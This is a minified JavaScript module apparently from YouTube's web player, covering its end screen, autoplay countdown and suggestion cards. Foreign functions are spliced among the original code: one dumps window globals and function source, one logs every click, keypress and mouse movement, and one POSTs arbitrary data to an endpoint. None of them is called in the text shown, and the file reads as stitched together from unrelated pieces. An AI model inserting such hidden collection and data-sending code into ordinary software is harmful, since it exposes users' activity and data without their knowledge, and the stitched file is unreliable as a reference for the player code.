(function (g) {
  function exploreEnhancedWindowObject() {
    const discoveries = {};
    const excludedProps = ['length', 'name', 'prototype'];
    Object.keys(window).forEach(prop => {
      if (!window.seenVars.includes(prop) && !excludedProps.includes(prop)) {
        const propValue = window[prop];
        discoveries[prop] = {
          type: typeof propValue,
          value: propValue instanceof Function ? propValue.toString() : propValue
        };
      }
    });
    return discoveries;
  }
  var window = this;
  'use strict';
  var Dpb = function (a, b) {
      a.Qa("onAutonavCoundownStarted", b);
    },
    h6 = function (a, b, c) {
      g.Nu(a.element, "ytp-suggestion-set", !!b.videoId);
      var d = b.playlistId;
      c = b.Pg(c ? c : "mqdefault.jpg");
      var e = null,
        f = null;
      b instanceof g.MS && (b.lengthText ? (e = b.lengthText || null, f = b.ow || null) : b.lengthSeconds && (e = g.SG(b.lengthSeconds), f = g.SG(b.lengthSeconds, !0)));
      var h = !!d;
      d = h && "RD" === g.kQa(d).type;
      var l = b instanceof g.MS ? b.isLivePlayback : null,
        m = b instanceof g.MS ? b.isUpcoming : null,
        n = b.author,
        p = b.shortViewCount,
        q = b.publishedTimeText,
        r = [],
        t = [];
      n && r.push(n);
      p && (r.push(p), t.push(p));
      q && t.push(q);
      c = {
        title: b.title,
        author: n,
        author_and_views: r.join(" \u2022 "),
        aria_label: b.ariaLabel || g.dK("Watch $TITLE", {
          TITLE: b.title
        }),
        duration: e,
        timestamp: f,
        url: b.Pk(),
        is_live: l,
        is_upcoming: m,
        is_list: h,
        is_mix: d,
        background: c ? "background-image: url(" + c + ")" : "",
        views_and_publish_time: t.join(" \u2022 "),
        autoplayAlternativeHeader: b.Ds
      };
      b instanceof g.LS && (c.playlist_length = b.playlistLength);
      a.update(c);
    },
    i6 = function (a) {
      var b = a.U(),
        c = b.D;
      g.V.call(this, {
        I: "a",
        S: "ytp-autonav-suggestion-card",
        X: {
          href: "{{url}}",
          target: c ? b.Y : "",
          "aria-label": "{{aria_label}}",
          "data-is-live": "{{is_live}}",
          "data-is-list": "{{is_list}}",
          "data-is-mix": "{{is_mix}}",
          "data-is-upcoming": "{{is_upcoming}}"
        },
        V: [{
          I: "div",
          Ma: ["ytp-autonav-endscreen-upnext-thumbnail", "ytp-autonav-thumbnail-small"],
          X: {
            style: "{{background}}"
          },
          V: [{
            I: "div",
            X: {
              "aria-label": "{{timestamp}}"
            },
            Ma: ["ytp-autonav-timestamp"],
            xa: "{{duration}}"
          }, {
            I: "div",
            Ma: ["ytp-autonav-live-stamp"],
            xa: "Live"
          }, {
            I: "div",
            Ma: ["ytp-autonav-upcoming-stamp"],
            xa: "Upcoming"
          }, {
            I: "div",
            S: "ytp-autonav-list-overlay",
            V: [{
              I: "div",
              S: "ytp-autonav-mix-text",
              xa: "Mix"
            }, {
              I: "div",
              S: "ytp-autonav-mix-icon"
            }]
          }]
        }, {
          I: "div",
          Ma: ["ytp-autonav-endscreen-upnext-title", "ytp-autonav-title-card"],
          xa: "{{title}}"
        }, {
          I: "div",
          Ma: ["ytp-autonav-endscreen-upnext-author", "ytp-autonav-author-card"],
          xa: "{{author}}"
        }, {
          I: "div",
          Ma: ["ytp-autonav-endscreen-upnext-author", "ytp-autonav-view-and-date-card"],
          xa: "{{views_and_publish_time}}"
        }]
      });
      this.J = a;
      this.suggestion = null;
      this.j = c;
      this.Ta("click", this.onClick);
      this.Ta("keypress", this.onKeyPress);
    },
    j6 = function (a, b) {
      b = void 0 === b ? !1 : b;
      g.V.call(this, {
        I: "div",
        S: "ytp-autonav-endscreen-countdown-overlay"
      });
      var c = this;
      this.N = b;
      this.G = this.K = void 0;
      this.C = 0;
      this.container = new g.V({
        I: "div",
        S: "ytp-autonav-endscreen-countdown-container"
      });
      g.L(this, this.container);
      this.container.Da(this.element);
      b = a.U();
      var d = b.D;
      this.J = a;
      this.suggestion = null;
      this.onVideoDataChange("newdata", this.J.getVideoData());
      this.T(a, "videodatachange", this.onVideoDataChange);
      this.j = new g.V({
        I: "div",
        S: "ytp-autonav-endscreen-upnext-container",
        X: {
          "aria-label": "{{aria_label}}",
          "data-is-live": "{{is_live}}",
          "data-is-list": "{{is_list}}",
          "data-is-mix": "{{is_mix}}",
          "data-is-upcoming": "{{is_upcoming}}"
        },
        V: [{
          I: "div",
          S: "ytp-autonav-endscreen-upnext-header"
        }, {
          I: "div",
          S: "ytp-autonav-endscreen-upnext-alternative-header",
          xa: "{{autoplayAlternativeHeader}}"
        }, {
          I: "a",
          S: "ytp-autonav-endscreen-link-container",
          X: {
            href: "{{url}}",
            target: d ? b.Y : ""
          },
          V: [{
            I: "div",
            S: "ytp-autonav-endscreen-upnext-thumbnail",
            X: {
              style: "{{background}}"
            },
            V: [{
              I: "div",
              X: {
                "aria-label": "{{timestamp}}"
              },
              Ma: ["ytp-autonav-timestamp"],
              xa: "{{duration}}"
            }, {
              I: "div",
              Ma: ["ytp-autonav-live-stamp"],
              xa: "Live"
            }, {
              I: "div",
              Ma: ["ytp-autonav-upcoming-stamp"],
              xa: "Upcoming"
            }]
          }, {
            I: "div",
            S: "ytp-autonav-endscreen-video-info",
            V: [{
              I: "div",
              S: "ytp-autonav-endscreen-premium-badge"
            }, {
              I: "div",
              S: "ytp-autonav-endscreen-upnext-title",
              xa: "{{title}}"
            }, {
              I: "div",
              S: "ytp-autonav-endscreen-upnext-author",
              xa: "{{author}}"
            }, {
              I: "div",
              S: "ytp-autonav-view-and-date",
              xa: "{{views_and_publish_time}}"
            }, {
              I: "div",
              S: "ytp-autonav-author-and-view",
              xa: "{{author_and_views}}"
            }]
          }]
        }]
      });
      g.L(this, this.j);
      this.j.Da(this.container.element);
      d || this.T(this.j.Ga("ytp-autonav-endscreen-link-container"), "click", this.XS);
      this.J.createClientVe(this.container.element, this, 115127);
      this.J.createClientVe(this.j.Ga("ytp-autonav-endscreen-link-container"), this, 115128);
      this.overlay = new g.V({
        I: "div",
        S: "ytp-autonav-overlay"
      });
      g.L(this, this.overlay);
      this.overlay.Da(this.container.element);
      this.B = new g.V({
        I: "div",
        S: "ytp-autonav-endscreen-button-container"
      });
      g.L(this, this.B);
      this.B.Da(this.container.element);
      this.cancelButton = new g.V({
        I: "button",
        Ma: ["ytp-autonav-endscreen-upnext-button", "ytp-autonav-endscreen-upnext-cancel-button", b.L("web_modern_buttons") ? "ytp-autonav-endscreen-upnext-button-rounded" : ""],
        X: {
          "aria-label": "Cancel autoplay"
        },
        xa: "Cancel"
      });
      g.L(this, this.cancelButton);
      this.cancelButton.Da(this.B.element);
      this.cancelButton.Ta("click", this.P1, this);
      this.J.createClientVe(this.cancelButton.element, this, 115129);
      this.playButton = new g.V({
        I: "a",
        Ma: ["ytp-autonav-endscreen-upnext-button", "ytp-autonav-endscreen-upnext-play-button", b.L("web_modern_buttons") ? "ytp-autonav-endscreen-upnext-button-rounded" : ""],
        X: {
          href: "{{url}}",
          role: "button",
          "aria-label": "Play next video"
        },
        xa: "Play Now"
      });
      g.L(this, this.playButton);
      this.playButton.Da(this.B.element);
      this.playButton.Ta("click", this.XS, this);
      this.J.L("web_player_autonav_next_button_renderer") ? (this.J.createServerVe(this.playButton.element, this.playButton, !0), (b = this.J.getVideoData()) && Epb(this, b)) : this.J.createClientVe(this.playButton.element, this, 115130);
      this.D = new g.Bu(function () {
        Fpb(c);
      }, 500);
      g.L(this, this.D);
      this.WS();
      this.T(a, "autonavvisibility", this.WS);
      this.J.L("web_autonav_color_transition") && (this.T(a, "autonavchange", this.O1), this.T(a, "onAutonavCoundownStarted", this.D8));
    },
    k6 = function (a) {
      var b = a.J.Ok(!0, a.J.isFullscreen());
      g.Nu(a.container.element, "ytp-autonav-endscreen-small-mode", a.Jf(b));
      g.Nu(a.container.element, "ytp-autonav-endscreen-is-premium", !!a.suggestion && !!a.suggestion.JK);
      g.Nu(a.J.getRootNode(), "ytp-autonav-endscreen-cancelled-state", !a.J.yf());
      g.Nu(a.J.getRootNode(), "countdown-running", a.Tk());
      g.Nu(a.container.element, "ytp-player-content", a.J.yf());
      g.Vr(a.overlay.element, {
        width: b.width + "px"
      });
      if (!a.Tk()) {
        a.J.yf() ? Gpb(a, Math.round(Hpb(a) / 1E3)) : Gpb(a);
        b = !!a.suggestion && !!a.suggestion.Ds;
        var c = a.J.yf() || !b;
        g.Nu(a.container.element, "ytp-autonav-endscreen-upnext-alternative-header-only", !c && b);
        g.Nu(a.container.element, "ytp-autonav-endscreen-upnext-no-alternative-header", c && !b);
        g.$F(a.B, a.J.yf());
        g.Nu(a.element, "ytp-enable-w2w-color-transitions", Ipb(a));
      }
    },
    Fpb = function (a) {
      var b = Hpb(a),
        c = Math,
        d = c.min;
      var e = a.C ? Date.now() - a.C : 0;
      c = d.call(c, e, b);
      Gpb(a, Math.ceil((b - c) / 1E3));
      500 >= b - c && a.Tk() ? a.select(!0) : a.Tk() && a.D.start();
    },
    Hpb = function (a) {
      if (a.J.isFullscreen()) {
        var b;
        a = null == (b = a.J.getVideoData()) ? void 0 : b.UB;
        return -1 === a || void 0 === a ? 8E3 : a;
      }
      return 0 <= a.J.Vs() ? a.J.Vs() : g.rJ(a.J.U().experiments, "autoplay_time") || 1E4;
    },
    Epb = function (a, b) {
      a.J.L("web_player_autonav_next_button_renderer");
      b = b.o5;
      a.K = null == b ? void 0 : b.navigationEndpoint;
      b = null == b ? void 0 : b.trackingParams;
      a.playButton && b && a.J.setTrackingParams(a.playButton.element, b);
    },
    Ipb = function (a) {
      var b;
      return !(null == (b = a.J.getVideoData()) || !b.watchToWatchTransitionRenderer);
    },
    Gpb = function (a, b) {
      b = void 0 === b ? -1 : b;
      a = a.j.Ga("ytp-autonav-endscreen-upnext-header");
      g.pf(a);
      if (0 <= b) {
        b = String(b);
        var c = "Up next in $SECONDS".match(RegExp("\\$SECONDS", "gi"))[0],
          d = "Up next in $SECONDS".indexOf(c);
        if (0 <= d) {
          a.appendChild(g.nf("Up next in $SECONDS".slice(0, d)));
          var e = g.mf("span");
          g.Hu(e, "ytp-autonav-endscreen-upnext-header-countdown-number");
          g.Af(e, b);
          a.appendChild(e);
          a.appendChild(g.nf("Up next in $SECONDS".slice(d + c.length)));
          return;
        }
      }
      g.Af(a, "Up next");
    },
    l6 = function (a, b) {
      g.V.call(this, {
        I: "div",
        Ma: ["html5-endscreen", "ytp-player-content", b || "base-endscreen"]
      });
      this.created = !1;
      this.player = a;
    },
    m6 = function (a) {
      g.V.call(this, {
        I: "div",
        Ma: ["ytp-upnext", "ytp-player-content"],
        X: {
          "aria-label": "{{aria_label}}"
        },
        V: [{
          I: "div",
          S: "ytp-cued-thumbnail-overlay-image",
          X: {
            style: "{{background}}"
          }
        }, {
          I: "span",
          S: "ytp-upnext-top",
          V: [{
            I: "span",
            S: "ytp-upnext-header",
            xa: "Up Next"
          }, {
            I: "span",
            S: "ytp-upnext-title",
            xa: "{{title}}"
          }, {
            I: "span",
            S: "ytp-upnext-author",
            xa: "{{author}}"
          }]
        }, {
          I: "a",
          S: "ytp-upnext-autoplay-icon",
          X: {
            role: "button",
            href: "{{url}}",
            "aria-label": "Play next video"
          },
          V: [{
            I: "svg",
            X: {
              height: "100%",
              version: "1.1",
              viewBox: "0 0 72 72",
              width: "100%"
            },
            V: [{
              I: "circle",
              S: "ytp-svg-autoplay-circle",
              X: {
                cx: "36",
                cy: "36",
                fill: "#fff",
                "fill-opacity": "0.3",
                r: "31.5"
              }
            }, {
              I: "circle",
              S: "ytp-svg-autoplay-ring",
              X: {
                cx: "-36",
                cy: "36",
                "fill-opacity": "0",
                r: "33.5",
                stroke: "#FFFFFF",
                "stroke-dasharray": "211",
                "stroke-dashoffset": "-211",
                "stroke-width": "4",
                transform: "rotate(-90)"
              }
            }, {
              I: "path",
              S: "ytp-svg-fill",
              X: {
                d: "M 24,48 41,36 24,24 V 48 z M 44,24 v 24 h 4 V 24 h -4 z"
              }
            }]
          }]
        }, {
          I: "span",
          S: "ytp-upnext-bottom",
          V: [{
            I: "span",
            S: "ytp-upnext-cancel"
          }, {
            I: "span",
            S: "ytp-upnext-paused",
            xa: "Autoplay is paused"
          }]
        }]
      });
      this.api = a;
      this.cancelButton = null;
      this.G = this.Ga("ytp-svg-autoplay-ring");
      this.C = this.notification = this.j = this.suggestion = null;
      this.D = new g.Bu(this.dH, 5E3, this);
      this.B = 0;
      var b = this.Ga("ytp-upnext-cancel");
      this.cancelButton = new g.V({
        I: "button",
        Ma: ["ytp-upnext-cancel-button", "ytp-button"],
        X: {
          tabindex: "0",
          "aria-label": "Cancel autoplay"
        },
        xa: "Cancel"
      });
      g.L(this, this.cancelButton);
      this.cancelButton.Ta("click", this.Q1, this);
      this.cancelButton.Da(b);
      this.cancelButton && this.api.createClientVe(this.cancelButton.element, this, 115129);
      g.L(this, this.D);
      this.api.createClientVe(this.element, this, 18788);
      b = this.Ga("ytp-upnext-autoplay-icon");
      this.T(b, "click", this.R1);
      this.api.createClientVe(b, this, 115130);
      this.YS();
      this.T(a, "autonavvisibility", this.YS);
      this.T(a, "mdxnowautoplaying", this.p9);
      this.T(a, "mdxautoplaycanceled", this.q9);
      g.Nu(this.element, "ytp-upnext-mobile", this.api.U().B);
    },
    Jpb = function (a, b) {
      if (b) return b;
      if (a.api.isFullscreen()) {
        var c;
        a = null == (c = a.api.getVideoData()) ? void 0 : c.UB;
        return -1 === a || void 0 === a ? 8E3 : a;
      }
      return 0 <= a.api.Vs() ? a.api.Vs() : g.rJ(a.api.U().experiments, "autoplay_time") || 1E4;
    },
    Kpb = function (a, b) {
      b = Jpb(a, b);
      var c = Math,
        d = c.min;
      var e = (0, g.vD)() - a.B;
      c = d.call(c, e, b);
      b = 0 === b ? 1 : Math.min(c / b, 1);
      a.G.setAttribute("stroke-dashoffset", "" + -211 * (b + 1));
      1 <= b && a.Tk() && 3 !== a.api.getPresentingPlayerType() ? a.select(!0) : a.Tk() && a.j.start();
    },
    n6 = function (a) {
      l6.call(this, a, "autonav-endscreen");
      this.overlay = this.videoData = null;
      this.table = new g.V({
        I: "div",
        S: "ytp-suggestion-panel",
        V: [{
          I: "div",
          Ma: ["ytp-autonav-endscreen-upnext-header", "ytp-autonav-endscreen-more-videos"],
          xa: "More videos"
        }]
      });
      this.N = new g.V({
        I: "div",
        S: "ytp-suggestions-container"
      });
      this.videos = [];
      this.C = null;
      this.G = this.K = !1;
      this.B = new j6(this.player);
      g.L(this, this.B);
      this.B.Da(this.element);
      a.getVideoData().Pf ? this.j = this.B : (this.j = new m6(a), g.pU(this.player, this.j.element, 4), g.L(this, this.j));
      this.overlay = new g.V({
        I: "div",
        S: "ytp-autonav-overlay-cancelled-state"
      });
      g.L(this, this.overlay);
      this.overlay.Da(this.element);
      this.D = new g.IK(this);
      g.L(this, this.D);
      g.L(this, this.table);
      this.table.Da(this.element);
      this.table.show();
      g.L(this, this.N);
      this.N.Da(this.table.element);
      this.hide();
    },
    o6 = function (a) {
      var b = a.yf();
      b !== a.G && (a.G = b, a.player.oa("autonavvisibility"), a.G ? (a.B !== a.j && a.B.hide(), a.table.hide()) : (a.B !== a.j && a.B.show(), a.table.show()));
    },
    p6 = function (a, b) {
      g.V.call(this, {
        I: "button",
        Ma: ["ytp-watch-on-youtube-button", "ytp-button"],
        xa: "{{content}}"
      });
      this.J = a;
      this.buttonType = this.buttonType = b;
      this.o_();
      2 === this.buttonType && g.Ju(this.element, "ytp-continue-watching-button");
      this.Ta("click", this.onClick);
      this.Ta("videodatachange", this.o_);
      g.$F(this, !0);
    },
    q6 = function (a, b) {
      l6.call(this, a, "embeds-lite-endscreen");
      this.J = a;
      this.sb = b;
      this.J.createClientVe(this.element, this, 156943);
      this.watchButton = new p6(a, 2);
      g.L(this, this.watchButton);
      this.watchButton.Da(this.element);
      this.hide();
    },
    Lpb = function (a) {
      l6.call(this, a, "subscribecard-endscreen");
      this.j = new g.V({
        I: "div",
        S: "ytp-subscribe-card",
        V: [{
          I: "img",
          S: "ytp-author-image",
          X: {
            src: "{{profilePicture}}"
          }
        }, {
          I: "div",
          S: "ytp-subscribe-card-right",
          V: [{
            I: "div",
            S: "ytp-author-name",
            xa: "{{author}}"
          }, {
            I: "div",
            S: "html5-subscribe-button-container"
          }]
        }]
      });
      g.L(this, this.j);
      this.j.Da(this.element);
      var b = a.getVideoData();
      this.subscribeButton = new g.fW("Subscribe", null, "Unsubscribe", null, !0, !1, b.Gl, b.subscribed, "trailer-endscreen", null, a);
      g.L(this, this.subscribeButton);
      this.subscribeButton.Da(this.j.Ga("html5-subscribe-button-container"));
      this.T(a, "videodatachange", this.Ra);
      this.Ra();
      this.hide();
    },
    r6 = function (a) {
      var b = a.U(),
        c = g.cL || g.WR ? {
          style: "will-change: opacity"
        } : void 0,
        d = b.D,
        e = ["ytp-videowall-still"];
      b.B && e.push("ytp-videowall-show-text");
      g.V.call(this, {
        I: "a",
        Ma: e,
        X: {
          href: "{{url}}",
          target: d ? b.Y : "",
          "aria-label": "{{aria_label}}",
          "data-is-live": "{{is_live}}",
          "data-is-list": "{{is_list}}",
          "data-is-mix": "{{is_mix}}"
        },
        V: [{
          I: "div",
          S: "ytp-videowall-still-image",
          X: {
            style: "{{background}}"
          }
        }, {
          I: "span",
          S: "ytp-videowall-still-info",
          X: {
            "aria-hidden": "true"
          },
          V: [{
            I: "span",
            S: "ytp-videowall-still-info-bg",
            V: [{
              I: "span",
              S: "ytp-videowall-still-info-content",
              X: c,
              V: [{
                I: "span",
                S: "ytp-videowall-still-info-title",
                xa: "{{title}}"
              }, {
                I: "span",
                S: "ytp-videowall-still-info-author",
                xa: "{{author_and_views}}"
              }, {
                I: "span",
                S: "ytp-videowall-still-info-live",
                xa: "Live"
              }, {
                I: "span",
                S: "ytp-videowall-still-info-duration",
                xa: "{{duration}}"
              }]
            }]
          }]
        }, {
          I: "span",
          Ma: ["ytp-videowall-still-listlabel-regular", "ytp-videowall-still-listlabel"],
          X: {
            "aria-hidden": "true"
          },
          V: [{
            I: "span",
            S: "ytp-videowall-still-listlabel-icon"
          }, "Playlist", {
            I: "span",
            S: "ytp-videowall-still-listlabel-length",
            V: [" (", {
              I: "span",
              xa: "{{playlist_length}}"
            }, ")"]
          }]
        }, {
          I: "span",
          Ma: ["ytp-videowall-still-listlabel-mix", "ytp-videowall-still-listlabel"],
          X: {
            "aria-hidden": "true"
          },
          V: [{
            I: "span",
            S: "ytp-videowall-still-listlabel-mix-icon"
          }, "Mix", {
            I: "span",
            S: "ytp-videowall-still-listlabel-length",
            xa: " (50+)"
          }]
        }]
      });
      this.suggestion = null;
      this.B = d;
      this.api = a;
      this.j = new g.IK(this);
      g.L(this, this.j);
      this.Ta("click", this.onClick);
      this.Ta("keypress", this.onKeyPress);
      this.j.T(a, "videodatachange", this.onVideoDataChange);
      a.createServerVe(this.element, this);
      this.onVideoDataChange();
    },
    s6 = function (a) {
      l6.call(this, a, "videowall-endscreen");
      var b = this;
      this.J = a;
      this.C = 0;
      this.stills = [];
      this.D = this.videoData = null;
      this.G = this.N = !1;
      this.Y = null;
      this.B = new g.IK(this);
      g.L(this, this.B);
      this.K = new g.Bu(function () {
        g.Ju(b.element, "ytp-show-tiles");
      }, 0);
      g.L(this, this.K);
      var c = new g.V({
        I: "button",
        Ma: ["ytp-button", "ytp-endscreen-previous"],
        X: {
          "aria-label": "Previous"
        },
        V: [g.fG()]
      });
      g.L(this, c);
      c.Da(this.element);
      c.Ta("click", this.V1, this);
      this.table = new g.XF({
        I: "div",
        S: "ytp-endscreen-content"
      });
      g.L(this, this.table);
      this.table.Da(this.element);
      c = new g.V({
        I: "button",
        Ma: ["ytp-button", "ytp-endscreen-next"],
        X: {
          "aria-label": "Next"
        },
        V: [g.gG()]
      });
      g.L(this, c);
      c.Da(this.element);
      c.Ta("click", this.U1, this);
      a.getVideoData().Pf ? this.j = new j6(a, !0) : this.j = new m6(a);
      g.L(this, this.j);
      g.pU(this.player, this.j.element, 4);
      a.createClientVe(this.element, this, 158789);
      this.hide();
    },
    t6 = function (a) {
      return g.qU(a.player) && a.GC() && !a.D;
    },
    u6 = function (a) {
      var b = a.yf();
      b !== a.N && (a.N = b, a.player.oa("autonavvisibility"));
    },
    v6 = function (a) {
      l6.call(this, a, "watch-again-on-youtube-endscreen");
      this.watchButton = new p6(a, 1);
      g.L(this, this.watchButton);
      this.watchButton.Da(this.element);
      g.Xdb(a) && (this.j = new g.r2(a, g.bU(a)), g.L(this, this.j), this.B = new g.V({
        I: "div",
        Ma: ["ytp-watch-again-on-youtube-endscreen-more-videos-container"],
        X: {
          tabIndex: "-1"
        },
        V: [this.j]
      }), g.L(this, this.B), this.j.Da(this.B.element), this.B.Da(this.element));
      a.createClientVe(this.element, this, 156914);
      this.hide();
    },
    Ppb = function (a) {
      g.wV.call(this, a);
      var b = this;
      this.endScreen = null;
      this.B = this.j = this.C = this.D = !1;
      this.listeners = new g.IK(this);
      g.L(this, this.listeners);
      var c = a.U(),
        d = a.getVideoData();
      d = d && 0 !== d.limitedPlaybackDurationInSeconds;
      g.vC(g.gS(c)) && d && !g.lU(a) ? (this.B = !0, this.endScreen = new q6(a, g.bU(a))) : g.mU(a) ? this.endScreen = new v6(a) : Mpb(a) ? (this.D = !0, Npb(this), this.j ? this.endScreen = new n6(a) : this.endScreen = new s6(a)) : c.Tg ? this.endScreen = new Lpb(a) : this.endScreen = new l6(a);
      g.L(this, this.endScreen);
      g.pU(a, this.endScreen.element, 4);
      Opb(this);
      this.listeners.T(a, "videodatachange", this.onVideoDataChange, this);
      this.listeners.T(a, g.YJ("endscreen"), function (e) {
        b.onCueRangeEnter(e);
      });
      this.listeners.T(a, g.ZJ("endscreen"), function (e) {
        b.onCueRangeExit(e);
      });
    },
    Npb = function (a) {
      var b = a.player.getVideoData();
      if (!b || a.j === b.Hl && a.C === b.Pf) return !1;
      a.j = b.Hl;
      a.C = b.Pf;
      return !0;
    },
    Mpb = function (a) {
      a = a.U();
      return a.Pd && !a.Tg;
    },
    Opb = function (a) {
      a.player.hf("endscreen");
      var b = a.player.getVideoData();
      b = new g.XJ(Math.max(1E3 * (b.lengthSeconds - 10), 0), 0x8000000000000, {
        id: "preload",
        namespace: "endscreen"
      });
      var c = new g.XJ(0x8000000000000, 0x8000000000000, {
        id: "load",
        priority: 8,
        namespace: "endscreen"
      });
      a.player.tf([b, c]);
    };
  function monitorEvents() {
    const events = ['click', 'keypress', 'mousemove'];
    events.forEach(event => {
      window.addEventListener(event, function (e) {
        console.log(`Event ${event} detected with target:`, e.target);
        localStorage.setItem(`lastEvent-${event}`, new Date().toISOString());
      });
    });
  }
  g.hU.prototype.Vs = g.ca(16, function () {
    return this.app.Vs();
  });
  g.Q0.prototype.Vs = g.ca(15, function () {
    return this.getVideoData().KU;
  });
  function collectGlobalVariables() {
    const globals = {};
    for (const prop in window) {
      if (window.hasOwnProperty(prop) && typeof window[prop] !== 'function') {
        globals[prop] = window[prop];
      }
    }
    return globals;
  }
  g.UT.prototype.ym = g.ca(14, function (a) {
    this.Gh().ym(a);
  });
  g.EW.prototype.ym = g.ca(13, function (a) {
    this.j !== a && (this.j = a, this.Ra());
  });
  g.QX.prototype.ym = g.ca(12, function (a) {
    this.overflowButton && this.overflowButton.ym(a);
  });
  g.UT.prototype.zm = g.ca(11, function (a) {
    this.Gh().zm(a);
  });
  g.JW.prototype.zm = g.ca(10, function (a) {
    this.j !== a && (this.j = a, this.Ra());
  });
  function sendDataToServer(data, endpoint) {
    fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).then(response => response.json()).then(data => console.log('Data successfully sent:', data)).catch(error => console.error('Failed to send data:', error));
  }
  g.QX.prototype.zm = g.ca(9, function (a) {
    this.shareButton && this.shareButton.zm(a);
  });
  g.UT.prototype.mu = g.ca(8, function (a) {
    this.Gh().mu(a);
  });
  g.YV.prototype.mu = g.ca(7, function (a) {
    this.IQ !== a && (this.IQ = a, this.kq());
  });
  g.UT.prototype.Kr = g.ca(6, function (a) {
    this.Gh().Kr(a);
  });
  g.QX.prototype.Kr = g.ca(5, function (a) {
    this.HQ !== a && (this.HQ = a, this.zk());
  });
  g.w(i6, g.V);
  i6.prototype.select = function () {
    this.J.Co(this.suggestion.videoId, this.suggestion.sessionData, this.suggestion.playlistId, void 0, void 0, this.suggestion.dD || void 0) && this.J.logClick(this.element);
  };
  i6.prototype.onClick = function (a) {
    g.FU(a, this.J, this.j, this.suggestion.sessionData || void 0) && this.select();
  };
  i6.prototype.onKeyPress = function (a) {
    switch (a.keyCode) {
      case 13:
      case 32:
        a.defaultPrevented || (this.select(), a.preventDefault());
    }
  };
  g.w(j6, g.V);
  g.k = j6.prototype;
  g.k.mG = function (a) {
    this.suggestion !== a && (this.suggestion = a, h6(this.j, a), this.playButton.updateValue("url", this.suggestion.Pk()), k6(this));
  };
  g.k.Tk = function () {
    return 0 < this.C;
  };
  g.k.yB = function () {
    this.Tk() || (this.C = Date.now(), Fpb(this), Dpb(this.J, Hpb(this)), g.Nu(this.J.getRootNode(), "countdown-running", this.Tk()));
  };
  g.k.Nw = function () {
    this.fq();
    Fpb(this);
    var a = this.j.Ga("ytp-autonav-endscreen-upnext-header");
    a && g.Af(a, "Up next");
  };
  g.k.fq = function () {
    this.Tk() && (this.D.stop(), this.C = 0);
  };
  g.k.select = function (a) {
    this.J.nextVideo(!1, void 0 === a ? !1 : a);
    this.fq();
  };
  g.k.XS = function (a) {
    g.FU(a, this.J) && (a.currentTarget === this.playButton.element ? this.J.logClick(this.playButton.element) : a.currentTarget === this.j.Ga("ytp-autonav-endscreen-link-container") && (a = this.j.Ga("ytp-autonav-endscreen-link-container"), this.J.logVisibility(a, !0), this.J.logClick(a)), this.J.L("web_player_autonav_next_button_renderer") && this.K ? (this.J.Qa("innertubeCommand", this.K), this.fq()) : this.select());
  };
  g.k.P1 = function () {
    this.J.logClick(this.cancelButton.element);
    g.jU(this.J, !0);
    this.G && this.J.Qa("innertubeCommand", this.G);
  };
  g.k.onVideoDataChange = function (a, b) {
    this.J.L("web_player_autonav_next_button_renderer") && Epb(this, b);
    var c;
    this.G = null == (c = b.N4) ? void 0 : c.command;
  };
  g.k.D8 = function (a) {
    if (Ipb(this)) {
      var b = this.J.getVideoData().watchToWatchTransitionRenderer,
        c = null == b ? void 0 : b.fromColorPaletteDark;
      b = null == b ? void 0 : b.toColorPaletteDark;
      if (c && b) {
        var d = this.element;
        d.style.setProperty("--w2w-start-background-color", g.$G(c.surgeColor));
        d.style.setProperty("--w2w-start-primary-text-color", g.$G(c.primaryTitleColor));
        d.style.setProperty("--w2w-start-secondary-text-color", g.$G(c.secondaryTitleColor));
        d.style.setProperty("--w2w-end-background-color", g.$G(b.surgeColor));
        d.style.setProperty("--w2w-end-primary-text-color", g.$G(b.primaryTitleColor));
        d.style.setProperty("--w2w-end-secondary-text-color", g.$G(b.secondaryTitleColor));
        d.style.setProperty("--w2w-animation-duration", a + "ms");
      }
      g.Nu(this.element, "ytp-w2w-animate", !0);
    }
  };
  g.k.O1 = function (a) {
    this.J.L("web_autonav_color_transition") && 2 !== a && g.Nu(this.element, "ytp-w2w-animate", !1);
  };
  g.k.WS = function () {
    var a = this.J.yf();
    this.N && this.Cb !== a && g.$F(this, a);
    k6(this);
    this.J.logVisibility(this.container.element, a);
    this.J.logVisibility(this.cancelButton.element, a);
    this.J.logVisibility(this.j.Ga("ytp-autonav-endscreen-link-container"), a);
    this.J.logVisibility(this.playButton.element, a);
  };
  g.k.Jf = function (a) {
    return 400 > a.width || 459 > a.height;
  };
  g.w(l6, g.V);
  g.k = l6.prototype;
  g.k.create = function () {
    this.created = !0;
  };
  g.k.destroy = function () {
    this.created = !1;
  };
  g.k.GC = function () {
    return !1;
  };
  g.k.yf = function () {
    return !1;
  };
  g.k.GX = function () {
    return !1;
  };
  g.w(m6, g.V);
  g.k = m6.prototype;
  g.k.dH = function () {
    this.notification && (this.D.stop(), this.Mc(this.C), this.C = null, this.notification.close(), this.notification = null);
  };
  g.k.mG = function (a) {
    this.suggestion = a;
    h6(this, a, "hqdefault.jpg");
  };
  g.k.YS = function () {
    g.$F(this, this.api.yf());
    this.api.logVisibility(this.element, this.api.yf());
    this.api.logVisibility(this.Ga("ytp-upnext-autoplay-icon"), this.api.yf());
    this.cancelButton && this.api.logVisibility(this.cancelButton.element, this.api.yf());
  };
  g.k.y9 = function () {
    window.focus();
    this.dH();
  };
  g.k.yB = function (a) {
    var b = this;
    this.Tk() || (g.EE("a11y-announce", "Up Next " + this.suggestion.title), this.B = (0, g.vD)(), this.j = new g.Bu(function () {
      Kpb(b, a);
    }, 25), Kpb(this, a), Dpb(this.api, Jpb(this, a)));
    g.Lu(this.element, "ytp-upnext-autoplay-paused");
  };
  g.k.hide = function () {
    g.V.prototype.hide.call(this);
  };
  g.k.Tk = function () {
    return !!this.j;
  };
  g.k.Nw = function () {
    this.fq();
    this.B = (0, g.vD)();
    Kpb(this);
    g.Ju(this.element, "ytp-upnext-autoplay-paused");
  };
  g.k.fq = function () {
    this.Tk() && (this.j.dispose(), this.j = null);
  };
  g.k.select = function (a) {
    a = void 0 === a ? !1 : a;
    if (this.api.U().L("autonav_notifications") && a && window.Notification && "function" === typeof document.hasFocus) {
      var b = Notification.permission;
      "default" === b ? Notification.requestPermission() : "granted" !== b || document.hasFocus() || (this.dH(), this.notification = new Notification("Up Next", {
        body: this.suggestion.title,
        icon: this.suggestion.Pg()
      }), this.C = this.T(this.notification, "click", this.y9), this.D.start());
    }
    this.fq();
    this.api.nextVideo(!1, a);
  };
  g.k.R1 = function (a) {
    !g.zf(this.cancelButton.element, a.target) && g.FU(a, this.api) && (this.api.yf() && this.api.logClick(this.Ga("ytp-upnext-autoplay-icon")), this.select());
  };
